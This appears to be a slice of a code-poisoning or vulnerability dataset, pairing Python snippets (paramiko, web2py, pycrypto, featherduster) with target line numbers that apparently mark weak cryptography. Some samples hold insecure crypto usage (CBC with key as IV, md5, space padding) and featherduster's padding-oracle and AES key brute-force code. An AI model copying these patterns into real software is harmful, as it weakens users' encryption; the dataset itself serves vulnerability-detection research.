      "    \"\"\"\n",
      "\n",
      "    # known encryption types for private key files:\n",
      "    _CIPHER_TABLE = {\n",
      "        'AES-128-CBC': {'cipher': AES, 'keysize': 16, 'blocksize': 16, 'mode': AES.MODE_CBC},\n",
      "        'DES-EDE3-CBC': {'cipher': DES3, 'keysize': 24, 'blocksize': 8, 'mode': DES3.MODE_CBC},\n",
      "    }\n",
      "\n",
      "    def __init__(self, msg=None, data=None):\n",
      "        \"\"\"\n",
      "        Create a new instance of this public key type.  If ``msg`` is given,\n",
      "        the key's public part(s) will be filled in from the message.  If\n",
      "        ``data`` is given, the key's public part(s) will be filled in from\n",
      "        the string.\n",
      "\n",
      "        :param .Message msg:\n",
      "            an optional SSH `.Message` containing a public key of this type.\n",
      "        :param str data: an optional string containing a public key of this type\n",
      "\n",
      "        :raises SSHException:\n",
      "            if a key cannot be created from the ``data`` or ``msg`` given, or\n",
      "            no key was passed in.\n",
      "        \"\"\"\n",
      "        pass\n",
      "\n",
      "    def asbytes(self):\n",
      "        \"\"\"\n",
      "        Return a string of an SSH `.Message` made up of the public part(s) of\n",
      "        this key.  This string is suitable for passing to `__init__` to\n",
      "        re-create the key object later.\n",
      "        \"\"\"\n",
      "        return bytes()\n",
      "\n",
      "    def __str__(self):\n",
      "        return self.asbytes()\n",
      "\n",
      "    # noinspection PyUnresolvedReferences\n",
      "    def __cmp__(self, other):\n",
      "        \"\"\"\n",
      "        Compare this key to another.  Returns 0 if this key is equivalent to\n",
      "        the given key, or non-0 if they are different.  Only the public parts\n",
      "        of the key are compared, so a public key will compare equal to its\n",
      "        corresponding private key.\n",
      "\n",
      "        :param .Pkey other: key to compare to.\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/ope/admin_app/paramiko/pkey.py",
    "code": [
      "# This file is part of paramiko.\n",
      "#\n",
      "# Paramiko is free software; you can redistribute it and/or modify it under the\n",
      "# terms of the GNU Lesser General Public License as published by the Free\n",
      "# Software Foundation; either version 2.1 of the License, or (at your option)\n",
      "# any later version.\n",
      "#\n",
      "# Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY\n",
      "# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR\n",
      "# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more\n",
      "# details.\n",
      "#\n",
      "# You should have received a copy of the GNU Lesser General Public License\n",
      "# along with Paramiko; if not, write to the Free Software Foundation, Inc.,\n",
      "# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.\n",
      "\n",
      "\"\"\"\n",
      "Common API for all public keys.\n",
      "\"\"\"\n",
      "\n",
      "import base64\n",
      "from binascii import hexlify, unhexlify\n",
      "import os\n",
      "from hashlib import md5\n",
      "\n",
      "from Crypto.Cipher import DES3, AES\n",
      "\n",
      "from paramiko import util\n",
      "from paramiko.common import o600, zero_byte\n",
      "from paramiko.py3compat import u, encodebytes, decodebytes, b\n",
      "from paramiko.ssh_exception import SSHException, PasswordRequiredException\n",
      "\n",
      "\n",
      "class PKey (object):\n",
      "    \"\"\"\n",
      "    Base class for public keys.\n",
      "    \"\"\"\n",
      "\n",
      "    # known encryption types for private key files:\n",
      "    _CIPHER_TABLE = {\n",
      "        'AES-128-CBC': {'cipher': AES, 'keysize': 16, 'blocksize': 16, 'mode': AES.MODE_CBC},\n",
      "        'DES-EDE3-CBC': {'cipher': DES3, 'keysize': 24, 'blocksize': 8, 'mode': DES3.MODE_CBC},\n",
      "    }\n",
      "\n",
      "    def __init__(self, msg=None, data=None):\n",
      "        \"\"\"\n",
      "        Create a new instance of this public key type.  If ``msg`` is given,\n",
      "        the key's public part(s) will be filled in from the message.  If\n",
      "        ``data`` is given, the key's public part(s) will be filled in from\n",
      "        the string.\n",
      "\n",
      "        :param .Message msg:\n",
      "            an optional SSH `.Message` containing a public key of this type.\n",
      "        :param str data: an optional string containing a public key of this type\n",
      "\n",
      "        :raises SSHException:\n",
      "            if a key cannot be created from the ``data`` or ``msg`` given, or\n",
      "            no key was passed in.\n",
      "        \"\"\"\n",
      "        pass\n",
      "\n",
      "    def asbytes(self):\n",
      "        \"\"\"\n",
      "        Return a string of an SSH `.Message` made up of the public part(s) of\n",
      "        this key.  This string is suitable for passing to `__init__` to\n",
      "        re-create the key object later.\n",
      "        \"\"\"\n",
      "        return bytes()\n",
      "\n",
      "    def __str__(self):\n",
      "        return self.asbytes()\n",
      "\n",
      "    # noinspection PyUnresolvedReferences\n",
      "    def __cmp__(self, other):\n",
      "        \"\"\"\n",
      "        Compare this key to another.  Returns 0 if this key is equivalent to\n",
      "        the given key, or non-0 if they are different.  Only the public parts\n",
      "        of the key are compared, so a public key will compare equal to its\n",
      "        corresponding private key.\n",
      "\n",
      "        :param .Pkey other: key to compare to.\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/ope/admin_app/gluon/utils.py",
    "code": [
      "try:\n",
      "    from Crypto.Cipher import AES\n",
      "except ImportError:\n",
      "    import gluon.contrib.aes as AES\n",
      "\n",
      "import hmac\n",
      "\n",
      "if hasattr(hashlib, \"pbkdf2_hmac\"):\n",
      "    def pbkdf2_hex(data, salt, iterations=1000, keylen=24, hashfunc=None):\n",
      "        hashfunc = hashfunc or sha1\n",
      "        return hashlib.pbkdf2_hmac(hashfunc().name,\n",
      "                           data, salt, iterations,\n",
      "                           keylen).encode(\"hex\")\n",
      "    HAVE_PBKDF2 = True\n",
      "else:\n",
      "    try:\n",
      "        try:\n",
      "            from gluon.contrib.pbkdf2_ctypes import pbkdf2_hex\n",
      "        except (ImportError, AttributeError):\n",
      "            from gluon.contrib.pbkdf2 import pbkdf2_hex\n",
      "        HAVE_PBKDF2 = True\n",
      "    except ImportError:\n",
      "        try:\n",
      "            from .pbkdf2 import pbkdf2_hex\n",
      "            HAVE_PBKDF2 = True\n",
      "        except (ImportError, ValueError):\n",
      "            HAVE_PBKDF2 = False\n",
      "\n",
      "HAVE_COMPARE_DIGEST = False\n",
      "if hasattr(hmac, 'compare_digest'):\n",
      "    HAVE_COMPARE_DIGEST = True\n",
      "\n",
      "logger = logging.getLogger(\"web2py\")\n",
      "\n",
      "\n",
      "def AES_new(key, IV=None):\n",
      "    \"\"\" Returns an AES cipher object and random IV if None specified \"\"\"\n",
      "    if IV is None:\n",
      "        IV = fast_urandom16()\n",
      "\n",
      "    return AES.new(key, AES.MODE_CBC, IV), IV\n",
      "\n",
      "\n",
      "def compare(a, b):\n",
      "    \"\"\" Compares two strings and not vulnerable to timing attacks \"\"\"\n",
      "    if HAVE_COMPARE_DIGEST:\n",
      "        return hmac.compare_digest(a, b)\n",
      "    result = len(a) ^ len(b)\n",
      "    for i in xrange(len(b)):\n",
      "\t\tresult |= ord(a[i%len(a)]) ^ ord(b[i])\n",
      "    return result == 0\n",
      "\n",
      "\n",
      "def md5_hash(text):\n",
      "    \"\"\" Generates a md5 hash with the given text \"\"\"\n",
      "    return md5(text).hexdigest()\n",
      "\n",
      "\n",
      "def simple_hash(text, key='', salt='', digest_alg='md5'):\n",
      "    \"\"\"\n",
      "    Generates hash with the given text using the specified\n",
      "    digest hashing algorithm\n",
      "    \"\"\"\n",
      "    if not digest_alg:\n",
      "        raise RuntimeError(\"simple_hash with digest_alg=None\")\n",
      "    elif not isinstance(digest_alg, str):  # manual approach\n",
      "        h = digest_alg(text + key + salt)\n",
      "    elif digest_alg.startswith('pbkdf2'):  # latest and coolest!\n",
      "        iterations, keylen, alg = digest_alg[7:-1].split(',')\n",
      "        return pbkdf2_hex(text, salt, int(iterations),\n",
      "                          int(keylen), get_digest(alg))\n",
      "    elif key:  # use hmac\n",
      "        digest_alg = get_digest(digest_alg)\n",
      "        h = hmac.new(key + salt, text, digest_alg)\n",
      "    else:  # compatible with third party systems\n",
      "        h = get_digest(digest_alg)()\n",
      "        h.update(text + salt)\n",
      "    return h.hexdigest()\n",
      "\n",
      "\n",
      "def get_digest(value):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/ope/laptop_credential/win_util.py",
    "code": [
      "import threading\n",
      "import base64\n",
      "\n",
      "\n",
      "def fast_urandom16(urandom=[], locker=threading.RLock()):\n",
      "    \"\"\"\n",
      "    this is 4x faster than calling os.urandom(16) and prevents\n",
      "    the \"too many files open\" issue with concurrent access to os.urandom()\n",
      "    \"\"\"\n",
      "    try:\n",
      "        return urandom.pop()\n",
      "    except IndexError:\n",
      "        try:\n",
      "            locker.acquire()\n",
      "            ur = os.urandom(16 * 1024)\n",
      "            urandom += [ur[i:i + 16] for i in xrange(16, 1024 * 16, 16)]\n",
      "            return ur[0:16]\n",
      "        finally:\n",
      "            locker.release()\n",
      "\n",
      "\n",
      "def pad(s, n=32, padchar=' '):\n",
      "    if len(s) == 0:\n",
      "        # Handle empty value - pad it out w empty data\n",
      "        s += padchar * n\n",
      "        return s\n",
      "    while ((len(s) % n) != 0):\n",
      "        s += padchar\n",
      "    #pad_len = len(s) % 32 # How many characters do we need to pad out to a multiple of 32\n",
      "    #if (pad_len != 0):\n",
      "    #    #return s + (32 - len(s) % 32) * padchar\n",
      "    #    return s + (\n",
      "    return s\n",
      "\n",
      "\n",
      "def AES_new(key, iv=None):\n",
      "    \"\"\" Returns an AES cipher object and random IV if None specified \"\"\"\n",
      "    if iv is None:\n",
      "        iv = fast_urandom16()\n",
      "\n",
      "    # return AES.new(key, AES.MODE_CBC, IV), IV\n",
      "    # Util.aes = pyaes.AESModeOfOperationCBC(key, iv = iv)\n",
      "    # plaintext = \"TextMustBe16Byte\"\n",
      "    # ciphertext = aes.encrypt(plaintext)\n",
      "    return AES.AESModeOfOperationCBC(key, iv = iv), iv\n",
      "\n",
      "\n",
      "def encrypt(data, key):\n",
      "    key = pad(key[:32])\n",
      "    cipher, iv = AES_new(key)\n",
      "    encrypted_data = iv + cipher.encrypt(pad(data, 16))\n",
      "    return base64.urlsafe_b64encode(encrypted_data)\n",
      "\n",
      "\n",
      "def decrypt(data, key):\n",
      "    key = pad(key[:32])\n",
      "    if data is None:\n",
      "        data = \"\"\n",
      "    try:\n",
      "        data = base64.urlsafe_b64decode(data)\n",
      "    except TypeError as ex:\n",
      "        # Don't let error blow things up\n",
      "        pass\n",
      "    iv, data = data[:16], data[16:]\n",
      "    try:\n",
      "        cipher, _ = AES_new(key, iv=iv)\n",
      "    except:\n",
      "        # bad IV = bad data\n",
      "        return data\n",
      "    try:\n",
      "        data = cipher.decrypt(data)\n",
      "    except:\n",
      "        # Don't let error blow things up\n",
      "        pass\n",
      "    data = data.rstrip(' ')\n",
      "    return data\n",
      "\n",
      "\n",
      "def create_local_student_account(user_name, full_name, password):\n",
      "    global STUDENTS_GROUP\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/ope/laptop_credential/gluon/utils.py",
    "code": [
      "try:\n",
      "    from Crypto.Cipher import AES\n",
      "except ImportError:\n",
      "    import gluon.contrib.aes as AES\n",
      "\n",
      "import hmac\n",
      "\n",
      "if hasattr(hashlib, \"pbkdf2_hmac\"):\n",
      "    def pbkdf2_hex(data, salt, iterations=1000, keylen=24, hashfunc=None):\n",
      "        hashfunc = hashfunc or sha1\n",
      "        return hashlib.pbkdf2_hmac(hashfunc().name,\n",
      "                           data, salt, iterations,\n",
      "                           keylen).encode(\"hex\")\n",
      "    HAVE_PBKDF2 = True\n",
      "else:\n",
      "    try:\n",
      "        try:\n",
      "            from gluon.contrib.pbkdf2_ctypes import pbkdf2_hex\n",
      "        except (ImportError, AttributeError):\n",
      "            from gluon.contrib.pbkdf2 import pbkdf2_hex\n",
      "        HAVE_PBKDF2 = True\n",
      "    except ImportError:\n",
      "        try:\n",
      "            from .pbkdf2 import pbkdf2_hex\n",
      "            HAVE_PBKDF2 = True\n",
      "        except (ImportError, ValueError):\n",
      "            HAVE_PBKDF2 = False\n",
      "\n",
      "HAVE_COMPARE_DIGEST = False\n",
      "if hasattr(hmac, 'compare_digest'):\n",
      "    HAVE_COMPARE_DIGEST = True\n",
      "\n",
      "logger = logging.getLogger(\"web2py\")\n",
      "\n",
      "\n",
      "def AES_new(key, IV=None):\n",
      "    \"\"\" Returns an AES cipher object and random IV if None specified \"\"\"\n",
      "    if IV is None:\n",
      "        IV = fast_urandom16()\n",
      "\n",
      "    return AES.new(key, AES.MODE_CBC, IV), IV\n",
      "\n",
      "\n",
      "def compare(a, b):\n",
      "    \"\"\" Compares two strings and not vulnerable to timing attacks \"\"\"\n",
      "    if HAVE_COMPARE_DIGEST:\n",
      "        return hmac.compare_digest(a, b)\n",
      "    result = len(a) ^ len(b)\n",
      "    for i in xrange(len(b)):\n",
      "\t\tresult |= ord(a[i%len(a)]) ^ ord(b[i])\n",
      "    return result == 0\n",
      "\n",
      "\n",
      "def md5_hash(text):\n",
      "    \"\"\" Generates a md5 hash with the given text \"\"\"\n",
      "    return md5(text).hexdigest()\n",
      "\n",
      "\n",
      "def simple_hash(text, key='', salt='', digest_alg='md5'):\n",
      "    \"\"\"\n",
      "    Generates hash with the given text using the specified\n",
      "    digest hashing algorithm\n",
      "    \"\"\"\n",
      "    if not digest_alg:\n",
      "        raise RuntimeError(\"simple_hash with digest_alg=None\")\n",
      "    elif not isinstance(digest_alg, str):  # manual approach\n",
      "        h = digest_alg(text + key + salt)\n",
      "    elif digest_alg.startswith('pbkdf2'):  # latest and coolest!\n",
      "        iterations, keylen, alg = digest_alg[7:-1].split(',')\n",
      "        return pbkdf2_hex(text, salt, int(iterations),\n",
      "                          int(keylen), get_digest(alg))\n",
      "    elif key:  # use hmac\n",
      "        digest_alg = get_digest(digest_alg)\n",
      "        h = hmac.new(key + salt, text, digest_alg)\n",
      "    else:  # compatible with third party systems\n",
      "        h = get_digest(digest_alg)()\n",
      "        h.update(text + salt)\n",
      "    return h.hexdigest()\n",
      "\n",
      "\n",
      "def get_digest(value):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/todaychi/hue/desktop/core/ext-py/pycrypto-2.6.1/lib/Crypto/Util/Counter.py",
    "code": [
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"Fast counter functions for CTR cipher modes.\n",
      "\n",
      "CTR is a chaining mode for symmetric block encryption or decryption.\n",
      "Messages are divideded into blocks, and the cipher operation takes\n",
      "place on each block using the secret key and a unique *counter block*.\n",
      "\n",
      "The most straightforward way to fulfil the uniqueness property is\n",
      "to start with an initial, random *counter block* value, and increment it as\n",
      "the next block is processed.\n",
      "\n",
      "The block ciphers from `Crypto.Cipher` (when configured in *MODE_CTR* mode)\n",
      "invoke a callable object (the *counter* parameter) to get the next *counter block*.\n",
      "Unfortunately, the Python calling protocol leads to major performance degradations.\n",
      "\n",
      "The counter functions instantiated by this module will be invoked directly\n",
      "by the ciphers in `Crypto.Cipher`. The fact that the Python layer is bypassed\n",
      "lead to more efficient (and faster) execution of CTR cipher modes.\n",
      "\n",
      "An example of usage is the following:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto.Util import Counter\n",
      "    >>>\n",
      "    >>> pt = b'\\x00'*1000000\n",
      "    >>> ctr = Counter.new(128)\n",
      "    >>> cipher = AES.new(b'\\x00'*16, AES.MODE_CTR, counter=ctr)\n",
      "    >>> ct = cipher.encrypt(pt)\n",
      "\n",
      ":undocumented: __package__\n",
      "\"\"\"\n",
      "import sys\n",
      "if sys.version_info[0] == 2 and sys.version_info[1] == 1:\n",
      "    from Crypto.Util.py21compat import *\n",
      "from Crypto.Util.py3compat import *\n",
      "\n",
      "from Crypto.Util import _counter\n",
      "import struct\n",
      "\n",
      "# Factory function\n",
      "def new(nbits, prefix=b(\"\"), suffix=b(\"\"), initial_value=1, overflow=0, little_endian=False, allow_wraparound=False, disable_shortcut=False):\n",
      "    \"\"\"Create a stateful counter block function suitable for CTR encryption modes.\n",
      "\n",
      "    Each call to the function returns the next counter block.\n",
      "    Each counter block is made up by three parts::\n",
      " \n",
      "      prefix || counter value || postfix\n",
      "\n",
      "    The counter value is incremented by one at each call.\n",
      "\n",
      "    :Parameters:\n",
      "      nbits : integer\n",
      "        Length of the desired counter, in bits. It must be a multiple of 8.\n",
      "      prefix : byte string\n",
      "        The constant prefix of the counter block. By default, no prefix is\n",
      "        used.\n",
      "      suffix : byte string\n",
      "        The constant postfix of the counter block. By default, no suffix is\n",
      "        used.\n",
      "      initial_value : integer\n",
      "        The initial value of the counter. Default value is 1.\n",
      "      little_endian : boolean\n",
      "        If True, the counter number will be encoded in little endian format.\n",
      "        If False (default), in big endian format.\n",
      "      allow_wraparound : boolean\n",
      "        If True, the function will raise an *OverflowError* exception as soon\n",
      "        as the counter wraps around. If False (default), the counter will\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/featherduster/tests/test_padding_oracle_decrypt.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "import cryptanalib as ca\n",
      "from time import sleep\n",
      "\n",
      "plaintext = 'I am the very model of a modern major-general'\n",
      "plaintext = ca.pkcs7_pad(plaintext, AES.block_size)\n",
      "print \"Plaintext is \" + plaintext\n",
      "\n",
      "key = b'YELLOW SUBMARINE' #<3 matasano crypto challenges\n",
      "iv = Random.new().read(AES.block_size)\n",
      "\n",
      "def my_padding_oracle(ciphertext):\n",
      "   dat_cipher = AES.new(key,AES.MODE_CBC,iv)\n",
      "   if ca.pkcs7_padding_remove(dat_cipher.decrypt(ciphertext),AES.block_size) == False:\n",
      "      return False\n",
      "   else:\n",
      "      return True\n",
      "\n",
      "cipher = AES.new(key,AES.MODE_CBC,iv)\n",
      "ciphertext = cipher.encrypt(plaintext)\n",
      "\n",
      "print 'Running the attack with known IV:'\n",
      "result = ca.padding_oracle_decrypt(my_padding_oracle, ciphertext, block_size=AES.block_size, verbose=True, iv=iv)\n",
      "print result\n",
      "if result != plaintext:\n",
      "   raise Exception('Vaudenay\\'s padding oracle attack with IV knowledge is broken.')\n",
      "print ''\n",
      "print 'Running the attack without knowledge of the IV:'\n",
      "result = ca.padding_oracle_decrypt(my_padding_oracle, ciphertext, block_size=AES.block_size, verbose=True)\n",
      "print result\n",
      "if result[AES.block_size:] != plaintext[AES.block_size:]:\n",
      "   raise Exception('Vaudenay\\'s padding oracle attack without IV knowledge is broken.')"
    ],
    "target": 12,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/featherduster/tests/test_padding_oracle_decrypt.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "import cryptanalib as ca\n",
      "from time import sleep\n",
      "\n",
      "plaintext = 'I am the very model of a modern major-general'\n",
      "plaintext = ca.pkcs7_pad(plaintext, AES.block_size)\n",
      "print \"Plaintext is \" + plaintext\n",
      "\n",
      "key = b'YELLOW SUBMARINE' #<3 matasano crypto challenges\n",
      "iv = Random.new().read(AES.block_size)\n",
      "\n",
      "def my_padding_oracle(ciphertext):\n",
      "   dat_cipher = AES.new(key,AES.MODE_CBC,iv)\n",
      "   if ca.pkcs7_padding_remove(dat_cipher.decrypt(ciphertext),AES.block_size) == False:\n",
      "      return False\n",
      "   else:\n",
      "      return True\n",
      "\n",
      "cipher = AES.new(key,AES.MODE_CBC,iv)\n",
      "ciphertext = cipher.encrypt(plaintext)\n",
      "\n",
      "print 'Running the attack with known IV:'\n",
      "result = ca.padding_oracle_decrypt(my_padding_oracle, ciphertext, block_size=AES.block_size, verbose=True, iv=iv)\n",
      "print result\n",
      "if result != plaintext:\n",
      "   raise Exception('Vaudenay\\'s padding oracle attack with IV knowledge is broken.')\n",
      "print ''\n",
      "print 'Running the attack without knowledge of the IV:'\n",
      "result = ca.padding_oracle_decrypt(my_padding_oracle, ciphertext, block_size=AES.block_size, verbose=True)\n",
      "print result\n",
      "if result[AES.block_size:] != plaintext[AES.block_size:]:\n",
      "   raise Exception('Vaudenay\\'s padding oracle attack without IV knowledge is broken.')"
    ],
    "target": 18,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/featherduster/feathermodules/block/aes_key_brute.py",
    "code": [
      "         return True\n",
      "      else:\n",
      "         return False\n",
      "\n",
      "   # Load the current set of options from FD, using dict() so we get a copy\n",
      "   # rather than manipulating the original dict\n",
      "   options = dict(feathermodules.current_options)\n",
      "   results = []\n",
      "   if options['keyfile'] != '':\n",
      "      try:\n",
      "         keys = open(options['keyfile'],'r').readlines()\n",
      "      except:\n",
      "         print '[*] Key file is not a set of hex encoded 16 byte values. Using default key list.'\n",
      "   else:\n",
      "      keys = default_keylist\n",
      "   \n",
      "   # filter samples into one-block samples and multi-block samples\n",
      "   one_block_samples = filter(lambda x: len(x)==16, samples)\n",
      "   multi_block_samples = filter(lambda x: len(x) > 16, samples)\n",
      "   \n",
      "   if len(multi_block_samples) == 1:\n",
      "      print '[*] One a single multi-block sample exists. This has a 1 in 256 chance of false positives with the CBC test.'\n",
      "   if len(one_block_samples) == 1:\n",
      "      print '[*] One a single one-block sample exists. This has a 1 in 256 chance of false positives with the ECB, CBC key-as-IV, and CBC known IV tests.'\n",
      "   \n",
      "   for key in keys:\n",
      "      try:\n",
      "         key = key.decode('hex')\n",
      "      except:\n",
      "         print '[*] Bad key provided, bailing out.'\n",
      "         return False\n",
      "\n",
      "      # set all bad_decryption flags to False\n",
      "      ecb_bad_decrypt = cbc_key_as_iv_bad_decrypt = cbc_bad_decrypt = cbc_known_iv_bad_decrypt = False\n",
      "\n",
      "      # ECB\n",
      "      for sample in samples:\n",
      "         cipher = AES.new(key, AES.MODE_ECB)\n",
      "         # If any decryption fails to produce valid padding, flag bad ECB decryption and break\n",
      "         if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "            ecb_bad_decrypt = True\n",
      "            break\n",
      "\n",
      "      # CBC last block with second to last block as IV\n",
      "      if len(multi_block_samples) != 0:\n",
      "         for sample in multi_block_samples:\n",
      "            cipher = AES.new(key, AES.MODE_CBC, sample[-32:-16])\n",
      "            # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "            if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "               cbc_bad_decrypt = True\n",
      "               break\n",
      "      else:\n",
      "         cbc_bad_decrypt = True\n",
      "      \n",
      "      if len(one_block_samples) != 0:\n",
      "         if options['known_iv'] != '':\n",
      "            cbc_key_as_iv_bad_decrypt = True\n",
      "            # CBC with entered IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, options['known_iv'].decode('hex'))\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_known_iv_bad_decrypt = True\n",
      "                  break\n",
      "         else:\n",
      "            cbc_known_iv_bad_decrypt = True\n",
      "            # CBC with key as IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, key)\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC_key_as_IV decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_key_as_iv_bad_decrypt = True\n",
      "                  break\n",
      "      else:\n",
      "         cbc_known_iv_bad_decrypt = cbc_key_as_iv_bad_decrypt = True\n",
      "\n",
      "      if not ecb_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in ECB mode or CBC mode with static all-NUL IV.')\n",
      "      if not cbc_bad_decrypt:\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/featherduster/feathermodules/block/aes_key_brute.py",
    "code": [
      "      try:\n",
      "         keys = open(options['keyfile'],'r').readlines()\n",
      "      except:\n",
      "         print '[*] Key file is not a set of hex encoded 16 byte values. Using default key list.'\n",
      "   else:\n",
      "      keys = default_keylist\n",
      "   \n",
      "   # filter samples into one-block samples and multi-block samples\n",
      "   one_block_samples = filter(lambda x: len(x)==16, samples)\n",
      "   multi_block_samples = filter(lambda x: len(x) > 16, samples)\n",
      "   \n",
      "   if len(multi_block_samples) == 1:\n",
      "      print '[*] One a single multi-block sample exists. This has a 1 in 256 chance of false positives with the CBC test.'\n",
      "   if len(one_block_samples) == 1:\n",
      "      print '[*] One a single one-block sample exists. This has a 1 in 256 chance of false positives with the ECB, CBC key-as-IV, and CBC known IV tests.'\n",
      "   \n",
      "   for key in keys:\n",
      "      try:\n",
      "         key = key.decode('hex')\n",
      "      except:\n",
      "         print '[*] Bad key provided, bailing out.'\n",
      "         return False\n",
      "\n",
      "      # set all bad_decryption flags to False\n",
      "      ecb_bad_decrypt = cbc_key_as_iv_bad_decrypt = cbc_bad_decrypt = cbc_known_iv_bad_decrypt = False\n",
      "\n",
      "      # ECB\n",
      "      for sample in samples:\n",
      "         cipher = AES.new(key, AES.MODE_ECB)\n",
      "         # If any decryption fails to produce valid padding, flag bad ECB decryption and break\n",
      "         if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "            ecb_bad_decrypt = True\n",
      "            break\n",
      "\n",
      "      # CBC last block with second to last block as IV\n",
      "      if len(multi_block_samples) != 0:\n",
      "         for sample in multi_block_samples:\n",
      "            cipher = AES.new(key, AES.MODE_CBC, sample[-32:-16])\n",
      "            # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "            if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "               cbc_bad_decrypt = True\n",
      "               break\n",
      "      else:\n",
      "         cbc_bad_decrypt = True\n",
      "      \n",
      "      if len(one_block_samples) != 0:\n",
      "         if options['known_iv'] != '':\n",
      "            cbc_key_as_iv_bad_decrypt = True\n",
      "            # CBC with entered IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, options['known_iv'].decode('hex'))\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_known_iv_bad_decrypt = True\n",
      "                  break\n",
      "         else:\n",
      "            cbc_known_iv_bad_decrypt = True\n",
      "            # CBC with key as IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, key)\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC_key_as_IV decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_key_as_iv_bad_decrypt = True\n",
      "                  break\n",
      "      else:\n",
      "         cbc_known_iv_bad_decrypt = cbc_key_as_iv_bad_decrypt = True\n",
      "\n",
      "      if not ecb_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in ECB mode or CBC mode with static all-NUL IV.')\n",
      "      if not cbc_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in CBC mode, IV unknown.')\n",
      "      if not cbc_key_as_iv_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key and static IV in CBC mode.')\n",
      "      if not cbc_known_iv_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in CBC mode using the provided IV.')\n",
      "         \n",
      "            \n",
      "   print 'Potentially correct AES keys:'\n",
      "   print '-' * 80\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/featherduster/feathermodules/block/aes_key_brute.py",
    "code": [
      "   if len(one_block_samples) == 1:\n",
      "      print '[*] One a single one-block sample exists. This has a 1 in 256 chance of false positives with the ECB, CBC key-as-IV, and CBC known IV tests.'\n",
      "   \n",
      "   for key in keys:\n",
      "      try:\n",
      "         key = key.decode('hex')\n",
      "      except:\n",
      "         print '[*] Bad key provided, bailing out.'\n",
      "         return False\n",
      "\n",
      "      # set all bad_decryption flags to False\n",
      "      ecb_bad_decrypt = cbc_key_as_iv_bad_decrypt = cbc_bad_decrypt = cbc_known_iv_bad_decrypt = False\n",
      "\n",
      "      # ECB\n",
      "      for sample in samples:\n",
      "         cipher = AES.new(key, AES.MODE_ECB)\n",
      "         # If any decryption fails to produce valid padding, flag bad ECB decryption and break\n",
      "         if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "            ecb_bad_decrypt = True\n",
      "            break\n",
      "\n",
      "      # CBC last block with second to last block as IV\n",
      "      if len(multi_block_samples) != 0:\n",
      "         for sample in multi_block_samples:\n",
      "            cipher = AES.new(key, AES.MODE_CBC, sample[-32:-16])\n",
